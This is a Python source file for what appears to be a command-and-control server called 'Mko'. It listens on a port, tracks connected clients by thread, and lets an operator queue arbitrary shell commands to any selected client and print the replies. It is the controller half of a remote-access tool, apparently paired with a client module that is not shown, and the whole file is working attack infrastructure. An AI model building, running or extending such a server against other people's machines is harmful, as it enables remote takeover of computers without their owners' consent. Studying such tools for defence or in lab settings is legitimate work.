import lib
import socket
import threading
import os
from command_controller import Client
import queue
import sys


server_host = '0.0.0.0'
server_port = 1234
max_number_of_connections = 5

threads = {}
clients = []
client_queues = {}
thread_to_conn = {}

connection_allowed = True


def handle_client(conn, addr, command_queue):
    global connection_allowed
    print(f"\n[+] New connection with {addr[0]}:{addr[1]}")

    current_thread = threading.current_thread()
    # print(f"Client ID : {current_thread.ident} \nMko >", end=" ")

    while connection_allowed:
        try:
            # Check if there are any commands to send to the client
            if not command_queue.empty():
                # print(f"\nCommand run in thread {current_thread.ident}")
                command = command_queue.get()
                conn.send(command.encode('utf-8'))

                message = conn.recv(1024).decode('utf-8')
                if not message:
                    break
                print(f"{message}\n")
                print(f"Mko (thread {current_thread}) >", end=" ")
        except socket.timeout:
            conn.send("exit".encode('utf-8'))
            continue

    print(f"[+] Connection closed with {addr[0]}:{addr[1]}")
    conn.close()


def accept_clients(s):
    global connection_allowed
    while connection_allowed:
        try:
            s.settimeout(1)
            conn, addr = s.accept()
            clients.append((conn, addr))

            # Create a new queue for this client
            command_queue = queue.Queue()
            client_queues[conn] = command_queue

            thread = threading.Thread(target=handle_client, args=(conn, addr, command_queue))

            # Prepare to store the next thread ID
            if len(threads) == 0:
                next_thread_id = 0
            else:
                next_thread_id = max(threads.keys()) + 1

            # Start the thread
            thread.start()

            # Store the thread ID
            id_thread = thread.ident
            threads[next_thread_id] = id_thread
            thread_to_conn[id_thread] = conn
        except socket.timeout:
            continue


# Function to interact with the terminal and choose a thread
def command_line_interface():
    global connection_allowed
    while True:
        command = input("Mko > ")

        if command.startswith("use"):
            try:
                thread_id = int(command.split()[1])
                if thread_id in thread_to_conn:
                    print(f"You are now using thread {thread_id}")
                    # Interact with the selected thread
                    while True:
                        sub_command = input(f"MKo (thread {thread_id}) > ")
                        if sub_command.lower() == "exit":
                            break
                        if sub_command:
                            conn = thread_to_conn[thread_id]
                            client_queues[conn].put(sub_command)
                elif thread_id in threads:
                    print(f"You are now using thread {threads[thread_id]}")
                    # Interact with the selected thread
                    while True:
                        sub_command = input(f"MKo (thread {threads[thread_id]}) > ")
                        if sub_command.lower() == "exit":
                            break
                        if sub_command:
                            conn = thread_to_conn[threads[thread_id]]
                            client_queues[conn].put(sub_command)

                else:
                    print(f"No thread found with ID {thread_id}")
            # except any error that may occur
            except Exception as e:
                print(f"An error occurred")
                print("Unknown command. Try 'use <ID>' or 'list' to list all threads.")
            # except ValueError:
            #     print("Invalid thread ID. Please enter a valid thread ID.")

        elif command == "list":
            print("ID   TID   \n--   ---  ")
            for thread_id in threads:
                print(f"{thread_id}   {threads[thread_id]}")

        elif command == "exit":
            print("Exiting...")
            connection_allowed = False
            break

        elif command == "help":
            lib.print_help_manager()
        else:
            print("Unknown command. Try 'use <ID>' or 'list' to list all threads.")


def main():
    # display the banner
    lib.print_mko_banner()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_host, server_port))
    s.listen(max_number_of_connections)

    print(f"[+] Waiting for connection on port {server_port}...")

    accept_thread = threading.Thread(target=accept_clients, args=(s,))
    accept_thread.start()

    # Display threads control information - GUI
    command_line_interface()

    for conn, addr in clients:
        # send exit to each client
        conn.send("exit".encode('utf-8'))
        conn.close()

    print("\nServer closed.")


if __name__ == "__main__":
    main()
